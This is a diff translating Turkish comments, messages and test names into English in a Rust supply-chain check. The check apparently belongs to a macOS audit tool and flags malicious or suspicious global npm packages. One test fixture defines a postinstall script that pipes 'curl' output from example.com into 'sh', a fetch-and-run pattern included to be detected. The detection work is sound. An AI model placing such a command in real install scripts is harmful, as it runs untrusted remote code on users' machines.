@@ -1,9 +1,10 @@
-//! Tedarik zinciri kontrolü: genel (global) kurulu npm paketleri arasında
-//! zararlı olduğu bilinen ya da şüpheli görünen var mı?
+//! Supply chain check: are any of the globally installed npm packages known
+//! to be malicious or suspicious-looking?
 //!
-//! Her denetimde hızlı çalışması için yalnızca genel kurulum dizinlerine ve
-//! `npx` önbelleğine bakar. Projelerin `node_modules` dizinlerini de kapsayan
-//! ayrıntılı tarama `--npm` modundadır; asıl mantık `crate::npm` içindedir.
+//! To stay fast on every audit it only looks at the global install
+//! directories and the `npx` cache. The detailed scan that also covers
+//! projects' `node_modules` directories is in `--npm` mode; the actual logic
+//! lives in `crate::npm`.
 
 use super::{Check, Outcome, Severity};
 use crate::npm::{self, Finding};
@@ -16,7 +17,7 @@ impl Check for NpmPackages {
         "npm-packages"
     }
     fn name(&self) -> &'static str {
-        "Zararlı npm paketleri"
+        "Malicious npm packages"
     }
     fn weight(&self) -> u32 {
         15
@@ -28,32 +29,32 @@ impl Check for NpmPackages {
     fn run(&self, runner: &dyn CommandRunner) -> Outcome {
         let roots = npm::global_roots(runner);
         if roots.is_empty() {
-            return Outcome::pass("Genel npm kurulum dizini bulunamadı; taranacak paket yok.");
+            return Outcome::pass("No global npm install directory found; no packages to scan.");
         }
         outcome(&npm::scan(&roots))
     }
 }
 
-/// Tarama sonucunu kontrol sonucuna çevirir.
+/// Converts the scan result into a check outcome.
 fn outcome(scan: &npm::Scan) -> Outcome {
     let malware: Vec<String> = scan.malware().map(describe).collect();
     if !malware.is_empty() {
         return Outcome::fail(
-            format!("Zararlı paketler: {}.", malware.join(", ")),
-            "Paketi kaldır, anahtar ve parolalarını yenile; ayrıntı için `--npm` ile tara.",
+            format!("Malicious packages: {}.", malware.join(", ")),
+            "Remove the package and rotate your keys and passwords; scan with `--npm` for details.",
         );
     }
 
     let suspicious: Vec<String> = scan.suspicious().map(describe).collect();
     if !suspicious.is_empty() {
         return Outcome::warn(
-            format!("Şüpheli kurulum betikleri: {}.", suspicious.join(", ")),
-            "Betiği incele; ayrıntı ve proje dizinleri için `--npm` ile tara.",
+            format!("Suspicious install scripts: {}.", suspicious.join(", ")),
+            "Review the script; scan with `--npm` for details and project directories.",
         );
     }
 
     Outcome::pass(format!(
-        "{} genel dizinde {} paket incelendi, zararlı bulunmadı.",
+        "{} global directories, {} packages inspected; no malware found.",
         scan.roots.len(),
         scan.packages
     ))
@@ -69,11 +70,11 @@ mod tests {
     use crate::checks::Status;
     use std::path::PathBuf;
 
-    /// Geçici bir `node_modules` kurup tarar.
+    /// Sets up a temporary `node_modules` and scans it.
     fn scan_fixture(label: &str, manifest: serde_json::Value) -> npm::Scan {
         let root: PathBuf = std::env::temp_dir()
             .join(format!("macos-audit-supply-{label}-{}", std::process::id()));
-        let package = root.join("node_modules/paket");
+        let package = root.join("node_modules/pkg");
         std::fs::create_dir_all(&package).unwrap();
         std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();
 
@@ -83,15 +84,15 @@ mod tests {
     }
 
     #[test]
-    fn temiz_paketler_gecer() {
+    fn clean_packages_pass() {
         let scan = scan_fixture("clean", serde_json::json!({ "name": "express", "version": "4.18.2" }));
         let outcome = outcome(&scan);
         assert_eq!(outcome.status, Status::Pass);
-        assert!(outcome.detail.contains("1 paket"));
+        assert!(outcome.detail.contains("1 packages"));
     }
 
     #[test]
-    fn bilinen_zararli_surum_basarisiz() {
+    fn known_malicious_version_fails() {
         let scan = scan_fixture("known", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
         let outcome = outcome(&scan);
         assert_eq!(outcome.status, Status::Fail);
@@ -99,11 +100,11 @@ mod tests {
     }
 
     #[test]
-    fn supheli_betik_uyari() {
+    fn suspicious_script_warns() {
         let scan = scan_fixture(
             "script",
             serde_json::json!({
-                "name": "paket",
+                "name": "pkg",
                 "version": "1.0.0",
                 "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
             }),
